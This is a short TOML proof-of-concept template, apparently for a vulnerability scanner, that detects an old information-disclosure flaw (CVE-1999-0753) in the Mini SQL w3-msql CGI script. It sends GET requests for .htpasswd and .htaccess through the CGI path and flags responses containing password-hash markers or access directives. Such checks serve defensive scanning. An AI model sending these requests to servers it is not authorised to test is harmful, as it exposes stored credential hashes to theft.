[info]
author = "ave"
description = "验证目标服务器上的 w3-msql CGI 脚本是否存在信息泄露漏洞，通过构造特制 HTTP 请求尝试访问受保护目录中的敏感文件（如 .htpasswd）或目录列表。"
id = "POC-AVE-1999-0606"
name = "Mini SQL w3-msql 信息泄露 PoC"
severity = "high"
tags = ["ave-1999-0606"]
vuln_id = [
    "CVE-1999-0753",
    "AVE-1999-0606",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/w3-msql/.htpasswd"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "apache",
    "sha1",
    "md5",
    "CRYPT",
    "$apr1",
    "$2y",
    "root:",
]

[[poc.requests]]
method = "GET"
path = "/cgi-bin/w3-msql/.htaccess"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Require",
    "deny",
    "allow",
    "AuthName",
    "AuthUserFile",
]
